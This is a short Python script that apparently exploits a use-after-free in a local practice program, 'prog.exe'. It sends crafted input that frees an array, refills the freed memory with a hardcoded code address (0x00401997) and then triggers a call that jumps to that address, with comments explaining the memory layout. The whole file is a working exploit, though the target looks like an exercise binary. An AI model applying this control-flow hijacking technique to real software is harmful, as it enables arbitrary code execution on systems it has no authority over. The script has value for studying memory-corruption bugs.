import subprocess

if __name__ == "__main__":
    dest_address = 0x00401997
    size = 3  # use 3 as the size cause Array is 12 bytes in memory and we want to take it's place (3*sizeof(int)=12)
    proc = subprocess.Popen('./prog.exe', stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    payload = b" 0 3 3 " # delete arr
    
    payload += f"1 {size} {dest_address} 0 ".encode('utf8')   
    payload += b"2 4" # activate function and exit
    proc.communicate(input=payload)
    proc.wait()
    # print(proc.returncode)
    